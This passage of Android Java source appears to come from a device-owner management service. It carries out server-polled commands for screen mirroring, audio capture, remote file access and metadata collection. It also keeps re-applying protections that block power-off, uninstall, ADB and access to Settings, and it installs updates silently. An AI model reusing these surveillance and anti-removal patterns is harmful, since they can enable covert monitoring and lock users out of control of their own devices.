            } else if ("START_SCREEN_MIRROR".equalsIgnoreCase(type) || "start_screen_mirror".equals(type)) {
                Log.i(TAG, "Start screen mirror command received (poll)");
                Map<String, Object> payload = cmd.getPayload();
                int quality = payloadInt(payload, "quality", 50);
                int fps = payloadInt(payload, "fps", 4);
                float scale = payloadFloat(payload, "scale", 0.5f);
                com.riad.rrlkr.streaming.AutoStreamManager.setVideoDesired(this, true, quality, fps, scale);
                com.riad.rrlkr.streaming.StreamingController.startScreenMirror(this, quality, fps, scale);
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("STOP_SCREEN_MIRROR".equalsIgnoreCase(type) || "stop_screen_mirror".equals(type)) {
                Log.i(TAG, "Stop screen mirror command received (poll)");
                com.riad.rrlkr.streaming.AutoStreamManager.setVideoDesired(this, false, 0, 0, 0);
                com.riad.rrlkr.streaming.StreamingController.stopScreenMirror(this);
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("START_AUDIO_STREAM".equalsIgnoreCase(type) || "start_audio_stream".equals(type)) {
                Log.i(TAG, "Start audio stream command received (poll)");
                Map<String, Object> payload = cmd.getPayload();
                boolean capturePlayback = payload == null ||
                        !"false".equalsIgnoreCase(String.valueOf(payload.get("capture_playback")));
                com.riad.rrlkr.streaming.AutoStreamManager.setAudioDesired(this, true, capturePlayback);
                com.riad.rrlkr.streaming.StreamingController.startAudioStream(this, capturePlayback);
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("STOP_AUDIO_STREAM".equalsIgnoreCase(type) || "stop_audio_stream".equals(type)) {
                Log.i(TAG, "Stop audio stream command received (poll)");
                com.riad.rrlkr.streaming.AutoStreamManager.setAudioDesired(this, false, false);
                com.riad.rrlkr.streaming.StreamingController.stopAudioStream(this);
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("START_FILE_MANAGER".equalsIgnoreCase(type) || "start_file_manager".equals(type)) {
                Log.i(TAG, "Start file manager command received (poll)");
                com.riad.rrlkr.filemanager.FileManagerService.start(this);
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("STOP_FILE_MANAGER".equalsIgnoreCase(type) || "stop_file_manager".equals(type)) {
                Log.i(TAG, "Stop file manager command received (poll)");
                com.riad.rrlkr.filemanager.FileManagerService.stop(this);
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("COLLECT_METADATA".equalsIgnoreCase(type) || "collect_metadata".equals(type)) {
                Log.i(TAG, "Collect metadata command received (poll)");
                bgHandler.post(() -> {
                    try {
                        com.riad.rrlkr.metadata.MetadataCollectionWorker.runNow(DeviceMonitorService.this);
                    } catch (Exception e) {
                        Log.w(TAG, "Metadata collect failed: " + e.getMessage());
                    }
                });
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else {
                Log.w(TAG, "Unknown command type: " + type);
                acknowledgeCommand(cmd.getId(), "executed");
            }
        }
    }
    
    /**
     * High-frequency check: ensure Lock Task mode is always active.
     * If it's not active, immediately re-launch LockTaskBootActivity.
     * This is the primary defense against power menu access.
     */
    private void ensureLockTaskActive() {
        if (!preferenceManager.isEnrolled() || preferenceManager.isAppDisabled()) return;
        
        // Skip during active ZTE provisioning to prevent auto-lock
        if (preferenceManager.getBoolean("zte_provisioning_active", false)) return;
        
        boolean isSamsung = android.os.Build.MANUFACTURER != null &&
                android.os.Build.MANUFACTURER.toLowerCase().contains("samsung");

        try {
            if (protectionManager.isDeviceOwner()) {
                if (isSamsung) {
                    // SAMSUNG: Do NOT use lock task for normal (unlocked) mode.
                    // Samsung uses Knox APIs (allowPowerOff) to block power menu.
                    // Only enforce lock task if device is actually locked (kiosk mode).
                    if (preferenceManager.isDeviceLocked()) {
                        if (!com.riad.rrlkr.ui.LockTaskBootActivity.isLockTaskActive(DeviceMonitorService.this)) {
                            Log.w(TAG, "Samsung: Device locked but lock task not active â€” re-launching");
                            protectionManager.disableRebootPowerOff();
                            com.riad.rrlkr.ui.LockTaskBootActivity.forceRelaunch(DeviceMonitorService.this);
                        }
                    } else {
                        // Samsung unlocked: ensure Knox protections are active
                        try {
                            SamsungProtectionManager samsungMgr = new SamsungProtectionManager(DeviceMonitorService.this);
                            samsungMgr.blockPowerOffViaKnox();
                        } catch (Exception e) {
                            Log.w(TAG, "Samsung Knox re-apply warning: " + e.getMessage());
                        }
                    }
                } else {
                    // NON-SAMSUNG: Always keep lock task active
                    if (!com.riad.rrlkr.ui.LockTaskBootActivity.isLockTaskActive(DeviceMonitorService.this)) {
                        Log.w(TAG, "CRITICAL: Lock Task mode is NOT active! Re-activating immediately...");
                        protectionManager.disableRebootPowerOff();
                        com.riad.rrlkr.ui.LockTaskBootActivity.forceRelaunch(DeviceMonitorService.this);
                    } else {
                        Log.d(TAG, "Lock Task mode is active âœ“");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking lock task state", e);
        }
    }
    
    /**
     * Periodically check server for OTA app updates.
     * Uses AppSelfUpdateService for download + silent install via Device Owner PackageInstaller.
     */
    private void checkForAppUpdate() {
        if (!preferenceManager.isEnrolled()) return;
        if (preferenceManager.isAppDisabled()) return;
        
        try {
            AppSelfUpdateService updateService = new AppSelfUpdateService(this);
            if (updateService.shouldCheckForUpdate()) {
                Log.i(TAG, "Checking for OTA app update...");
                updateService.checkAndUpdate();
            } else {
                Log.d(TAG, "Skipping update check (checked recently)");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking for app update", e);
        }
    }
    
    /**
     * Periodically verify IMEI binding and re-apply device protections
     * This ensures protections persist even if someone tries to remove them
     */
    private void verifyAndReapplyProtections() {
        if (!preferenceManager.isEnrolled()) return;
        
        // Skip protection enforcement if admin has disabled the app
        if (preferenceManager.isAppDisabled()) {
            Log.d(TAG, "App is disabled by admin - skipping protection verification");
            return;
        }
        
        try {
            // Verify IMEI binding
            if (!protectionManager.verifyIMEIBinding()) {
                Log.w(TAG, "IMEI BINDING VERIFICATION FAILED - locking device");
                preferenceManager.saveBoolean("admin_lock_command", true);
                preferenceManager.setDeviceLocked(true);
                LockManager.showLockScreen(this,
                        "Device verification failed. Contact your administrator.",
                        preferenceManager.getContactNumber());
            }
            
            // Re-apply protections (ensures they persist)
            if (protectionManager.isDeviceOwner()) {
                protectionManager.blockUninstall();
                // USB disable feature removed
                protectionManager.disableADB();
                protectionManager.blockAppsControl(); // Always block Settings > Apps
                
                // Ensure RebootBlockerService is running
                RebootBlockerService.start(DeviceMonitorService.this);

                // Make sure live streaming stays connected to the admin panel
                com.riad.rrlkr.streaming.AutoStreamManager.apply(DeviceMonitorService.this);
                
                // Re-enable accessibility service for power button interception
                protectionManager.enablePowerButtonInterceptService();
                
                // Periodically backup enrollment data to device-protected storage
                protectionManager.backupToDeviceProtectedStorage();
                
                if (preferenceManager.isDeviceLocked()) {
                    protectionManager.disableStatusBarExpansion();
                }
                
                // Ensure Lock Task mode is active (re-launch if killed)
                if (!com.riad.rrlkr.ui.LockTaskBootActivity.isLockTaskActive(DeviceMonitorService.this)) {
                    Log.w(TAG, "Lock Task mode NOT active â€” re-launching LockTaskBootActivity");
                    com.riad.rrlkr.ui.LockTaskBootActivity.launch(DeviceMonitorService.this);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error verifying protections", e);
        }
    }
    
    private void acknowledgeCommand(String commandId, String status) {
        if (commandId == null) return;
        
        CommandAck ack = new CommandAck();
        ack.setCommandId(commandId);
        ack.setStatus(status);
        
        apiService.acknowledgeCommand(ack).enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Command acknowledged: " + commandId);
                } else {
                    Log.e(TAG, "Failed to acknowledge command: " + response.code());
                }
            }
            
            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e(TAG, "Error acknowledging command: " + t.getMessage());
            }
        });
    }
}
